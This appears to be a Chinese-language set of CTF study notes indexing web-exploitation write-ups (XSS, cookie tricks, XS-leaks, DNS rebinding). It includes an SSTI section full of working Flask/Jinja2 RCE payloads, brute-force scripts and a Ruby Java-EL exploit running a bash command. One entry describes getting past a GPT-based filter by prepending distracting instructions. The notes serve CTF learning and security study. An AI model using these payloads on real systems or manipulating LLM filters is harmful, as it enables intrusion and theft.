    - 网站存在xss，但只有拥有对应用户的cookie才能触发xss（即self xss）；网站还提供了将admin bot登录为某个用户的OAuth端口，但这样会导致admin bot的cookie不再拥有admin的权限，进而无法通过获取admin的cookie提权。解法是利用之前见过的cookie jar overflow，设置多个cookie挤掉admin的旧cookie，并塞入攻击者的cookie（指定`path`，使该cookie只在self xss处有效）。因为当前的cookie只在某个路径处有效，且旧cookie被挤掉了；所以admin bot会重新登录拿新的admin cookie。由此便确保admin bot既拥有admin权限的cookie，又能访问xss payload
    - Postgre SQL注入。利用union select注入可以获取rce：
        - https://adeadfed.com/posts/postgresql-select-only-rce/
        - https://pulsesecurity.co.nz/articles/postgres-sqli
    - 非预期解： https://seall.dev/posts/htbctf2025aurorsarchive 。除了上面提到self xss，还有另一个地方存在xss。漏洞成因是网站只检查了参数的长度不能大于10，但题目使用的express开启了`extended: true`，导致可以用`data[]=x`绕过
        - 结果wp提到的xss其实也不是预期解。预期解见 https://frevadiscor.dev/blog/2025/03/25/htb-ca-2025-web-writeups ，需要利用Vue Template Compiler的行为（csti，有点像模板注入）用多段payload组成self xss： https://matanber.com/blog/4-char-csti
- [Eldoria Panel](https://blog.elmosalamy.com/posts/htb-cyber-apocalypse-2025-writeup)
    - [DOMPurify 3.1.2 mutation XSS](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes)
    - 绕过`file_exists`和`file_get_contents`。常用的`php://`和`http://`无法绕过前者，但是`ftp://`可以
    - wp中提到的非预期解见： https://github.com/sebastianosrt/CTF-Writeups/blob/main/HTB/CyberApochalipse25-TalesFromEldoria/Eldoria%20Panel.md ，导致无需用xss获取admin token就能访问admin面板
        - 类似的middleware错误好像之前见过，都是用了个if语句判断session设置是否正确，但没有中途返回；无论什么情况都会走到最后的放行代码（`return $handler->handle($request)`）
- [safestnote](https://adragos.ro/dice-ctf-2025-quals)
    - 网站前端的js代码使用户可以通过传get参数将笔记存入localstorage中，并展示localstorage中笔记的内容。可以提交给admin bot任意网址。bot会先将flag存入笔记中再用同一个tab访问提交的网址。笔记内容经过dompurify过滤，但没有csp
    - session history：当用户填写form的input时，chrome会记忆填写的内容。后续返回到这个网页会自动填充之前的填写的内容。不过填充的位置是相对的。比如chrome记忆填写的内容位于网页的第一个input字段（称为A）；假如后续在A之前插入了另一个input B，则填写的内容会出现在B里
    - css injection技巧，选定动态填写的input字段里的内容： https://stackoverflow.com/a/29612733 。不过这个技巧要求攻击者可以控制input字段的pattern属性
    - bfcache会导致缓存页面的js代码不执行。如果能控制页面的js代码的话，加一句`window.addEventListener('unload', ()=>{})`可以阻止这点；或者进行6次以上的navigation，因为bfcache最多记录前6个页面
- [convenience store](https://github.com/onionymous/ctf_challenges/blob/main/dicectf2025_quals/convenience_store)
    - 利用[Android Custom Tabs](https://developer.chrome.com/docs/android/custom-tabs)实现xs leak
        - 漏洞基于这篇论文里的内容： https://minimalblue.com/data/papers/SECWEB22_broken_bridge.pdf
        - Android Custom Tabs与手机内的浏览器共享状态（比如cookies），且提供了测量Custom Tabs中加载的网站的信号的方法。类似xs leak中将某个网站放进iframe并测量加载时长的方法，但这个方法不会被iframe相关的csp挡住
    - 此题的admin bot会先访问一个网站存储note，然后运行攻击者提供的android app。网站提供了note的搜索功能，若搜索的note内容存在则加载耗时更长
- [nobin](http://blog.maple3142.net/2025/03/31/dicectf-2025-quals-writeups)
    - 白给了xss，目标是泄漏出shared storage里的内容。使用方可以调用`sharedStorage.set(key,content)`来存储内容，但访问存储的内容时需要定义一个worklet，在worklet内部定义处理内容的逻辑。后续用`sharedStorage.worklet.addModule`加载定义的worklet模块。特别之处在于worklet运行在额外的js环境中，能访问的api很少，就算能访问存储的内容也很难完整地直接传递出去。Private Aggregation API据说可以，但用起来很复杂，不如侧信道
    - wp里的侧信道的思路在于发现worklet环境中可以访问crypto库。在worklet中反复生成rsa密钥会导致外部环境（调用方）的生成速度变慢。不过这种方案比较绕，api其实提供了`sharedStorage.selectURL`函数，调用方可以传递一组url给worklet，由worklet根据存储的内容决定返回哪个url。其他解法： **nobin** ，提供了额外三个技巧：
        - 直接在worklet内部调用sleep，这会影响worklet何时传回url的相关信息。调用方可以利用各个iframe的加载速度判断是哪个worklet耗时更长
        - `console.log(Object.keys(this))`会使整个tab崩溃，观察崩溃的情况可以得到flag的内容
        - 如何利用Browsing Context Group（BCG）反复进行某个攻击
- [A Minecraft Movie](https://adrianjunge.de/ctf/umdctf/A%20Minecraft%20Movie)
    - DOMPurify Client-side XSS过滤。允许src为`youtube.com/embed`的iframe，同时admin bot（puppeteer）固定点击id为`dislike-button`的元素。目标是让admin like某个post。没想到竟然能有四种解法
    - DOM clobbering。网站使用了js全局对象`window.sessionNumber`控制post请求发送的参数：`sessionNumber=${window.sessionNumber}&likes=-10`。于是可以构造`<a href="&likes=10" id="sessionNumber">`，使得`window.sessionNumber`的值为`&likes=10`，覆盖后面的同名参数
    - DOMPurify没有禁止form元素，同时selenium/puppeteer内部使用的`document.getElementById('id')`会返回dom中第一个id为`id`的元素（如果有重复）。所以可以自行创建一个id为`dislike-button`的form实现csrf
    - `youtube.com/embed`只允许目的地为google相关域名。但存在一个`googleads`产品允许重定向至任意网站。加上cookie的属性为`sameSite=none`，可以直接在别的网站执行攻击
    - 创建一个id为`dislike-button`的div元素，同时通过style属性设置其css，将div移到like按钮下。bot会选中这个元素，但在执行click操作时，由于代码模拟的是真实的鼠标点击，实际点到的是like按钮而不是div元素
    - 其他稍有不同的解法：**A Minecraft Movie**
    - 以及，这题是react网站，因此上述逻辑需要去混淆后才能看到。直接拿AI就好： https://fireshellsecurity.team/umdctf2025-web-writeups
- [Wembsoncket](https://github.com/BYU-CSA/BYUCTF-2025/tree/main/web/wembsoncket)
    - Cross-Site WebSocket Hijacking (CSWSH)。websocket没有同源策略，因此可以从任何origin发起连接，所谓“Cross-Site”。其实是可以用验证cookie等手段防止劫持的，但这题admin bot的cookie设置为samesite=none
    - 一个使用cloudflared替代ngrok的方法： https://baozongwi.xyz/p/byuctf2025 。`cloudflared tunnel --url http://localhost:8000`，不需要账号或者域名，可得到一个`xxx.trycloudflare.com`子域名
- [XXS XSS](https://hackmd.io/VXBgjljNTKatGeOx1O8v7A)
    - `javascript:`协议的利用。可以控制`window.location.href`的值，但长度不能超过15：让url等于`javascript:name`(必须是name，协议只识别这个名称，随后原封不动地渲染其内容),然后get传name参数设置执行的html
- [NOT XSS](https://hackmd.io/VXBgjljNTKatGeOx1O8v7A)
    - cookie长度通常存在上限，浏览器会拒绝超过长度上限的cookie
    - xs leak。当猜对部分flag时app会增加cookie的长度，并渲染cookie中存储的note。如果将cookie长度设为`上限-1`，就能根据note的渲染情况，一个字符一个字符地爆破flag
    - https://github.com/runasy-koonta/nhnc-2025-not-xss-solver
- [Window-of-Opportunity](https://hxuu.github.io/blog/ctf/l3ak25/window-of-opportunity)
    - puppeteer `--disable-web-security` flag禁用Same-Origin Policy (SOP)
    - 这题的关键在于admin bot使用`window.open(Url, "_blank")`访问页面`Url`时没有配置`noopener`和`noreferrer`，导致`Url`页面可以访问`window.opener`，进而操控`window.opener.location`，读取`window.opener.document.body.innerText`（仅在同源或禁用sop时可以这么做）
    - 题目源码： https://github.com/L3AK-TEAM/L3akCTF-2025-public/tree/main/web/Window_of_Opportunity 。似乎因为没有检查url，导致可以直接用`javascript:eval`执行xss
- [Mutant](https://github.com/typicallhavok/CTF/blob/main/Writeups/DownUnderCTF/mutant.md)
    - dom clobbering，但是dom node。如果在form标签里放置名为x的input标签的话，`form.x`优先取出form的input标签而不是同名属性（如attributes）
    - 利用style标签和style属性（`onanimationend`）触发xss，无需用户交互。之前在`neko-note`见过
    - 其他解法：**mutant**
        - 预期的mutation xss
        - 利用form的autofocus和onfocus自动触发xss
    - https://jorianwoltjer.com/blog/p/research/mutation-xss
- [Sweet Treat](https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/sweet_treat)
    - 利用[cookie sandwich](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique)偷取httponly cookie。不过局限性较大，要求网站本身存在一个回显用户cookie字段的地方
    - Apache tomcat允许用户发送`$Version` cookie将使用的cookie parser降级为legacy版本。攻击利用了legacy的一个特殊语法：cookie可以包含引号，且引号也是值的一部分
    - 因此攻击者可以构造start和end，使两者包住目标cookie：`start="a;secret=flag;end="`。由于tomcat读取cookie时会完整地读取引号包裹的内容，网页回显`start`的内容会泄漏secret的内容
- [file_upload](https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/file_upload)
    - 使用`navigator.serviceWorker.register`可以注册一个js文件，绕过可能的Cross-Origin-Opener-Policy(COOP)。service worker文件的mime type必须是`text/javascript`，且与注册service worker的html同源
    - 在旧版本的chrome可以直接open：**file_upload**
- [Infopass](https://bhavya32.github.io/#/writeups/8d55a894-18c6-405a-a3f2-170474b479c7)
    - 利用iframe的srcdoc属性可以创造出`window.origin`和`window.location`不一致的情况
    - 官方wp： https://github.com/infobahnctf/CTF-2025/tree/main/web/infopass
- [Sandbox Viewer](https://github.com/infobahnctf/CTF-2025/tree/main/web/sandbox-viewer)
    - 若网站从cloudfare cdn加载脚本且出现html注入，可以通过设置注入元素（如img）的属性`referrerpolicy="unsafe-url"`使cloudflare返回403，污染disk cache使网站后续无法正常加载脚本
- [XML translator](https://github.com/infobahnctf/CTF-2025/tree/main/web/xml-translator)
    - php的xml_set_default_handler无法正确处理编码后的属性值： https://github.com/php/php-src/issues/20439
- [1337 translator](https://github.com/infobahnctf/CTF-2025/tree/main/web/1337-translator)
    - 部分字符大写后可用于绕过滤，如`<ſ`大写后是`<S`
    - **1337-translator**
- [Swift resume service](https://github.com/infobahnctf/CTF-2025/tree/main/web/swift-resume-service)
    - swift内部使用[unicode extended grapheme cluster](http://www.unicode.org/reports/tr29/#Grapheme_Cluster_Boundaries)，但绝大多数其他软件用的都是unicode code points。比如swift替换`"`时不会替换掉`"́`（双引号后跟一个字符）；但在html中这个字符中的双引号仍会发挥原本的作用
- [Ripples](https://github.com/trannghiach/ChapBaiSlayer-CTF-Writeups/blob/main/Amateurs%20CTF/Amateurs%20CTF%202025/web/Ripples.md)
    - 当php的参数数量超过`max_input_vars`（默认1000）时，后续无法正常调用`header()`，导致无法发送诸如csp的重要header
    - https://x.com/pilvar222/status/1784619224670797947 , https://blog.arkark.dev/2025/09/08/asisctf-quals
- [cgi](https://blog.arkark.dev/2023/12/28/seccon-finals)
    - header injection：攻击者可以控制服务器响应的内容
    - 利用`Content-Security-Policy-Report-Only`进行xs leak。该header可以指定一个hash，当页面中的style的hash不符合指定的hash时对指定网站发出请求
    - 类似题目：**devilnetv2**
- [Pasteboard](https://estse.github.io/posts/uoftctf-2026-pasteboard)
    - 利用Chromedriver将localhost origin上的xss提升至rce： https://book.jorianwoltjer.com/web/client-side/headless-browsers#chromedriver
- [Unrealistic](https://github.com/bhavya32/web-writeups/blob/main/uoft.md)
    - DNS rebinding技巧：使用多个A记录（A records）。有时候浏览器缓存DNS的同时还忽略了TTL，导致rebind无法及时生效。这时可以选择给域名绑定多个A记录，一个解析到`x.x.x.x`，一个解析到`y.y.y.y`。浏览器解析域名时会在两条记录中随机选择，除非其中一个记录返回`TCP RST`；这时浏览器会固定解析到另一个记录
    - [Private Network Access(PNA)](https://wicg.github.io/private-network-access)阻挡任何来自公共URL的私有本地IP访问，包括iframe中的请求。然而用`window.open`在新标签页中打开私有IP页面的请求可以发送出去
    - 攻击路径概述：
        - 用dns rebinding将某个域名（比如`test.com`）解析为`x.x.x.x`(攻击者服务器)和`127.0.0.1`
        - 假设bot访问`test.com`时采用的是`x.x.x.x`的记录。`x.x.x.x`递送下一阶段的js payload后运行`exit(0)`强制下线
        - payload使用`window.open`打开`test.com/flag`。由于`x.x.x.x`已下线，这将访问`127.0.0.1/flag`，绕过题目设置的本地ip检查
        - 题目将flag放在了httponly cookie中，因此payload需要用`fetch("test.com:5005",{credentials: 'include'})`提取出flag。`5005`端口号是随机的，只要`127.0.0.1`在这个端口上没有服务即可。浏览器找不到`127.0.0.1:5005`便会解析成`test.com:5005`
        - 全程的host都是一样的，不会影响cookie的传递
    - 其他解法：**unrealistic**
        - 预期解是cached xss+Cookie delete + Cookie Sandwitch+ISO-2022-JP charset encoding+[Dangling Markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
            - cached xss的原理与[framed-xss](https://m0z.ie/research/2025-12-19-Seccon-CTF-2025-Writeups-Web)这题一致。这类题目中存在一个带有xss漏洞的路径A，但需要用户发送某个header来触发。应用中还存在另一个路径B，帮助用户发送header获取payload，但B中不存在直接的xss。cached xss的原理是，先访问路径B，使浏览器缓存xss payload后再访问路径A，绕过路径A的判断逻辑，直接返回缓存的内容
            - chrome和mozilla已经移除了ISO-2022-JP字符集的自动检测，但仍然可以用meta标签强制切换
        - 创建两个dns记录，使得`a.x.com`指向攻击者服务器，`b.x.com`指向127.0.0.1。只要设置cookie的domain为`x.com`就不会影响后续cookie的设置（虽然不能跨subdomain读cookie，但可以在subdomain中设置cookie）
        - https://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari 。利用A记录和AAAA记录实现dns rebinding
- [Awesome Router](https://github.com/KarimTantawey/CTFs/blob/main/0xL4ugh-CTF-V5/Awesome%20Router)
    - flask的session系统使用Tagged JSON serialization，用TagMarkup存储复杂类型的cookie值。jinja2渲染这些内容时不会转义字符，有html注入的风险
- [1nfin1ty](https://github.com/ZeyadZonkorany/0xL4ugh-CTF-2025-Web)
    - 题目要求窃取某个路径下的cookie，假设路径为`/a`。`/a`使用`res.socket.destroy`中断所有连接，但可以用过长的get参数使url长度超过限制，触发431错误。浏览器会将错误视作服务器的响应，随即下发cookie
    - firefox/Chromium XSSI(Cross-Site Script Inclusion)本地文件读取
    - **1nfin1ty**
        - 可以先访问路径`/b`，然后用`history.pushState` API在不刷新页面的前提下将URL更换成`/a`。由于pushState不会更新其他状态，还要将location改成`javascript:"anything"`触发更新
- [extend-note](https://ctf.krauq.com/lactf-2026)
    - 在`X-Content-Type-Options: nosniff` header下，仍然可以用`<link rel="prefetch">`区分text/html的http状态码200/404，实现xs leak
    - ntfy.sh 可以用作leak的接收方
    - python的urlparse解析`http://a.com\@localhost`得到的hostname是localhost，但浏览器实际访问的地点是`a.com`
    - [预期解](https://github.com/uclaacm/lactf-archive/blob/main/2026/web/extend-note)利用bfcache的配额限制进行xs leak。chrome限制bfcache最多缓存6个页面。假如提前打开6个页面然后访问目标页面，那么在目标页面执行`window.history.go(-7);`时，根据第一个页面是否需要重新加载就能判断目标页面返回的是200还是404
        - 可以用`window.onpageshow`的事件`event.persisted`或`NotRestoredReasons`API判断
        - 类似思路但更加简单的解法：**extend-note**
- [ad-note](https://github.com/uclaacm/lactf-archive/blob/main/2026/web/ad-note)
    - 题目是一个note app，提供了根据note内容搜索note的功能。admin bot将一个nonce存在了自己的note里，目标是获取这个nonce
        - 搜索note的页面存在广告，以iframe形式嵌入；搜索结果（如果有）则是以sandbox srcdoc iframe嵌入
        - 总iframe数量（广告+可能的搜索结果）在一个范围内随机波动
    - [fetchLater API与Deferred Fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Deferred_Fetch):`fetchLater()` API可以请求deferred fetch，在一段时间甚至是tab关闭后发送。由于用户无法取消它们，chrome限制了网络数据的配额（quota）。top-level document和其内部的subframe一共有512KiB
    - 攻击手段是xs leak：
        - 利用同站的另一道xss题目放置solver，使得admin cookie得到传递并使其能够创建 delegated deferred-fetch iframe
        - solver中创建一个Permission Policy为[deferred-fetch](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Permissions-Policy/deferred-fetch)的iframe，允许每个sub-frame得到64KiB的quota。用这个iframe搜索note
        - 由于跨域限制，无法查看这个iframe的内容。但仍然可以访问页面中存在的iframe数量
        - 如果没有搜索出任何东西，则页面中全部的iframe都是广告iframe；否则存在一个非广告iframe。关键区别在于，chrome会给每个广告iframe分配64KiB quota，而不会给结果iframe分配，因为sandbox srcdoc iframe 没有 allow-same-origin，具有 opaque origin
        - solver通过在top origin document中不断调用 fetchLater 填充 quota，观察何时失败，从而推测当前剩余 quota,反推有多少个广告iframe使用了quota。如果数量与先前获取的iframe数量不符，说明有一个iframe是结果iframe；否则说明全部是广告iframe
    - 非预期解：**ad-note**
        - 解法1:利用题目提供的API可以给全部ad iframe设置name属性。如果设置为NAME，则后续调用`window.NAME`可以得到页面中第一个ad iframe。假如w也是这个页面的window，用w[i]同样可以获取全部iframe。在结果iframe存在的情况下，有小概率出现w[0]不等于`window.NAME`的情况
        - 解法2:用`iframe.contentWindow[i]`可以访问全部iframe，但无法直接拿到里面的内容。可以用`iframe.contentWindow[i].location`修改iframe的location。此举会触发navigation，用`history.length`可以观察到变化，除非修改后和修改前的location均为`about:srcdoc`。所以如果我们将所有iframe的location改成`about:srcdoc`，若结果iframe存在，则`w.history.length`的值会与iframe数量不符
- [DiceWallet](https://github.com/bhavya32/web-writeups/blob/main/dicectf.md)
    - 分析firefox插件中的xss
    - `chrome.tabs.sendMessage`通过tabId决定向哪个tab发送消息，但同一个id可能对应不同的tab origin，有toctou的风险
    - 利用STTF进行xs leak。STTF允许页面滚动到指定词语处。如果攻击者在当前页面下可以注入html，便能检测到页面是否滚动，从而判断猜测的词语是否正确

## SSTI

ssti（模板注入）。这张简单但是经典的表说明当出现ssti时如何测试是什么模板。

![ssti_test](../../CTF/BUUCTF/images/Pasted-1-768x458.png)

模板注入分很多种，慢慢积累。

- [twig](https://xz.aliyun.com/t/10056#toc-13)(php)
- [smarty](https://www.anquanke.com/post/id/272393)(php)
- [flask](../../CTF/攻防世界/3级/Web/shrine.md)(python)。例题1:[[GYCTF2020]FlaskApp](../../CTF/BUUCTF/Web/[GYCTF2020]FlaskApp.md)。例题2（利用[subprocess.Popen](https://blog.csdn.net/whatday/article/details/109315876)执行命令）:[[CSCCTF 2019 Qual]FlaskLight](https://blog.csdn.net/mochu7777777/article/details/107589811)。命令：`{{''.__class__.__mro__[1].__subclasses__()[395]('ls',shell=True,stdout=-1).communicate()[0].strip()}}`。索引需要爆破：

```python
import requests
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}
for i in range(300,1000):
    url = "http://935b5916-e3d0-4949-80b9-7273c9f46f7b.challenge.ctf.show/hello/{{''.__class__.__mro__[1].__subclasses__()"+f"[{i}]"+"}}"
    res = requests.get(url=url, headers=headers)
    print(res.text)
    if 'Popen' in res.text:
        print(i)
        break 
```
  - 当flask的{{}}被过滤时，可以用{%%}来绕过过滤。例题:[[GWCTF 2019]你的名字](https://blog.csdn.net/cjdgg/article/details/119813547),更多绕过方式可参考[此处](https://blog.csdn.net/miuzzx/article/details/110220425)
  - 最简单的getshell payload(配合eval): `__import__("os").popen("ls").read()`，来源:[[watevrCTF-2019]Supercalc](https://blog.csdn.net/a3320315/article/details/104272833)
  - 能发现flask注入需要大量`.`,`_`，如果被过滤了可以用`[]`替代`.`，16进制编码替代`_`。例如`{{()."__class__"."__bases__"[0]."__subclasses__"()[91]["get_data"](0, "/proc/self/fd/3")}}`绕过过滤的写法就是`{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}`。例题:[[pasecactf_2019]flask_ssti](https://blog.csdn.net/qq_40800734/article/details/107011638)
  - 有时候执行的命令在url里会被截断，可以通过传参的方式解决这个问题。`{{ "".__class__.__base__ .__subclasses__()[132].__init__.__globals__['popen'](request.args.get("cmd")).read()}}ge?cmd=cat /flag `
  - 利用request.values绕过过滤。需要爆破索引
    ```py
    """ import requests 
    for num in range(300): 
        url = ""
        d={"prefix":"{{","suffix":"}}","username":f"().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__({num}).__init__.__globals__.__getitem__(request.values.a)","a":"popen"}
        res = requests.post(url,data=d).text 
        if "popen" in res: 
            print(num) 
            break """
    import requests 
    url = ""
    d={"prefix":"{{","suffix":"}}","username":f"().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(140).__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()","a":"popen",'b':'env'}
    res = requests.post(url,data=d).text 
    print(res)
    ```
- `url_for.__globals__.os.__dict__.popen(request.args.file).read()`，然后传参file，内容为要执行的命令
- `url_for.__globals__.os.environ`,拿环境变量
- `config.__class__.from_envvar.__globals__.__builtins__.__import__(request.args.a).getenv(request.args.b)`，参数a是要导入的模块（os），参数b是环境变量名（把getenv换了就能执行别的了）
- `().__class__.mro()[1].__subclasses__()[337](get_flashed_messages.__class__.__mro__[1].__subclasses__()[3]((0x65,0x78,0x70,0x6f,0x72,0x74)).decode(),shell=True,stdout=-1).communicate()[0].strip()`
- `().__class__.__base__.__subclasses__()[148]()._module.__builtins__[request.args.b](request.args.c).environ`
- [Obligatory](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Obligatory.md)（ https://hackmd.io/@Chivato/HyWsJ31dI ）
     - `{{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27cmd%27)|attr(%27read%27)()}}`
    - `{{%22%22|attr(%27\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f%27)|attr(%27\x5f\x5f\x62\x61\x73\x65\x5f\x5f%27)|attr(%27\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(411)(%27cmd%27,shell=True,stdout=-1)|attr(%27communicate%27)()}}`
    - 获取SECRET KEY：`{{self|attr("\x5f\x5fdict\x5f\x5f")}}`
- [PickYourStarter](https://github.com/MasonCompetitiveCyber/PatriotCTF2023/tree/main/Web/pickyourstarter)
    - 可以用自定义header传命令：`{{joiner.__init__.__globals__.os.popen(request.headers.cmd).read()}}`,然后header里添加`cmd: cat flag.txt`
`{{().__class__.__base__.__subclasses__().__getitem__(455)(request.args.shell,shell=True,stdout=(1).__neg__()).communicate()}}`:用getitem绕`[]`过滤，`(1).__neg__()`绕负号过滤
- [My First App](https://ireland.re/posts/UofTCTF_2024/#webmy-first-app)
    - 过滤方括号、下划线及引号。利用lipsum逃逸，`|attr()`代替方括号，并将带有下划线的项放在请求头，用`request.pragma.0`访问（有些header里面没法放下划线，Pragma可以，所以用多个Pragma传递带有下划线的项，数字表示第i个Pragma里的内容）
    - **My First App**
- [My Second App](https://hubert.hackin.ca/posts/uoftctf25-my-second-app)
    - python flask ssti绕过滤的究极题目。关键是用filter语法`|`（jinjia独有，普通pyjail不能用）
    - 这题还有个hash extension attack
- [Deathday Card](https://nullbrunk.github.io/posts/pragyan-deathdaycard)
    - 利用`config.update`绕过payload size限制。见 https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti 。之前在`Drink from my Flask`见过
    - [预期解](https://github.com/delta/PCTF25-Writeups/blob/main/web/birthday-card)则是利用了有多处注入点的设置用`%set`设置变量。殊途同归
- [Frog-WAF](https://fireshellsecurity.team/sekaictf-frog-waf-and-chunky)
    - java ssti模板注入（[EL - Expression Language](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language)）。此题的难点在于waf，限制了所有数字和一些特殊符号与java的类名
    - 其他payload：
        - https://github.com/AlbertoFDR/CTF/tree/main/2023/ProjectSekai/web/Frog-WAF
        - https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba
        - https://github.com/SuperStormer/writeups/tree/master/sekaictf_2023/web/frog-waf
        - https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00
        ```rb
        require 'http'
        def gen_s(s)
            a = <<E.strip!
            [].toString().getClass().getMethods()[#{Array.new(22, []).inspect}.size()].invoke([].toString(), [].size()).getClass().getMethods()[#{Array.new(5, []).inspect}.size()].invoke([].toString().getClass().getMethods()[#{Array.new(22, []).inspect}.size()].invoke([].toString(), [].size()), %s.size())
        E
            r = []
            s.chars.each do |c|
                r << a % Array.new(c.ord, []).inspect
            end
            sr = ""
            r.each do
                if sr.length.zero?
                    sr << _1
                    next
                else
                    sr << (".concat(%s)" % _1)
                end
            end
            sr
        end
        cn = gen_s("java.lang.Runtime")
        # https://ares-x.com/tools/runtime-exec/
        cmd = gen_s("bash -c {echo,Y2F0IC9mbGFnLSoudHh0}|{base64,-d}|{bash,-i}")
        bcn = gen_s("java.util.Base64")
        exp = <<E.strip!
        [].getClass().getClass().getMethods()[#{Array.new(2, []).inspect}.size()].invoke(null, #{cn}).getMethods()[#{Array.new(6, []).inspect}.size()].invoke(null).exec(#{cmd}).getInputStream()
        E
        r_exp = <<E.strip!
        ${[].getClass().getClass().getMethods()[#{Array.new(2, []).inspect}.size()].invoke(null, #{bcn}).getMethods()[#{Array.new(6, []).inspect}.size()].invoke(null).getClass().getMethods()[#{Array.new(4, []).inspect}.size()].invoke([].getClass().getClass().getMethods()[#{Array.new(2, []).inspect}.size()].invoke(null, #{bcn}).getMethods()[#{Array.new(6, []).inspect}.size()].invoke(null), #{exp}.readAllBytes())}
        E
        url = "http://frog-waf.chals.sekai.team/addContact"
        r = HTTP.post(url, json: {"firstName": "test", "lastName": "test", "description": "test", "country": r_exp})
        puts r
        ```
- [Aspiring Calculator](https://github.com/4n86rakam1/writeup/tree/main/TUCTF_2023/Web/Aspiring_Calculator)
    - C# ASP.NET Razor engine SSTI
- [My First Blog](https://github.com/4n86rakam1/writeup/blob/main/TUCTF_2023/Web/My_First_Blog)
    - 过滤部分关键词后的python flask ssti
- [gpwaf](https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003#Web-115-gpwaf-180-solves)
    - ejs模板注入。题目增加了一个绕过gpt过滤的环节。这种用gpt做过滤的题之前没见过，做的时候发现只要payload带有ejs注入必须的`<%`就报错，完全不知道怎么绕过。后面看了wp意识到这是gpt，不是黑/白名单之类的过滤，在payload前加几句干扰gpt的指令即可（以及不用`<%`的纯ejs注入确实不可能）
    - 其他解法（干扰gpt语句+ejs注入payload）： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#gpwaf
- [untitled-smarty-challenge](https://ireland.re/posts/idekctf_2024)
	- php smarty 5模板注入rce。棘手的点在于smarty 5移除了很多方便rce的内容（如`system`），这个时候就要看题目里有没有可疑的库（明明dockerfile里安装了，但是完全没用，或者用得很没必要），里面可能有可用的函数
	- smarty每次成功渲染一个模板文件后，都会在当前目录生成一个`templates_c`文件夹，里面的每个文件内容都是被渲染的模板转换成php文件的结果。不知道是不是个例，似乎模板文件名也会在转义后原封不动写入文件。该文件的名称同机器下完全一致（在docker里还原环境后查看生成的文件名，和服务端实际生成的文件名相同）
	- 具体payload见[官方wp](https://github.com/idekctf/idekctf-2024/tree/main/web/untitled-smarty-challenge)。其他解法： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#untitled-smarty-challenge
- [Cat Club](https://crypto-cat.gitbook.io/ctf-writeups/2024/intigriti/web/cat_club)
    - jwt [algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)。常出现于“明明有现成的jwt库但是却自己写了个验证函数“的情况
        - 补个exp更简单的题目的wp: https://dyn20.gitbook.io/writeup-ctf/root-me/json-web-token-jwt-public-key
    - js pug库ssti。注意`pug.render`(compile函数也会触发ssti)的参数有没有未过滤的用户输入。补点常用payload： https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs
- [Ez ⛳ v3](https://mariosk1574.com/posts/kalmar-ctf-2025-ez-v3)
    - caddyfile `httpInclude`模板注入。比赛时真正卡住我的地方竟然是如何连接服务器……文件内存在`strict_sni_host insecure_off`，可以用openssl以一种特定的方式连接；但是用浏览器的话会显示没有指定的mtls证书
    - 指定`Host` header也能绕过mtls连接（以及一个更灵活的注入方式）：**Ez ⛳ v3** 和 https://mqcybersec.org/writeups/25-kalmar-ezv3
- [Request Handling](https://github.com/Yazan03/CTF-writeups2025/tree/main/DU%20CTF/Request%20Handling)
    - [Handlebars](https://handlebarsjs.com)的`Handlebars.compile`函数的source参数可以传入字符串或ast(ast injection)
    - 其他资料
        - ssti解法：**Request Handling** （在可获取req对象的情况下：`Handlebars.compile(req.query.x)({req})`）
        - 原理解析： https://enoch.host/archives/Handlebars-AST-syntax-tree-injection-issue
        - 模板引擎pug里的类似漏洞/如何利用原型链污染触发： https://po6ix.github.io/AST-Injection
- [airspeed](https://k0w4lzk1.vercel.app/blog/QnQSec25-writeup)
    - 绕过nginx proxy：在路径后加一些特殊字符可能会导致代理与后端服务器对路径的判断不一致，见 https://book.hacktricks.wiki/en/pentesting-web/proxy-waf-protections-bypass.html
    - [velocity](https://velocity.apache.org/engine/1.7/user-guide.html)/[Airspeed](https://github.com/purcell/airspeed)模板注入
    - 其他wp： https://github.com/S450R1/qnqsec-ctf-writeups/tree/main/web/airspeed
- [No Quotes 3](https://lance-kenji.gitbook.io/uoftctf-2026-writeups/web/uoftctf-2026-no-quotes-3)
    - flask无引号、句点(`.`)的payload
- [更多模板注入payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md)
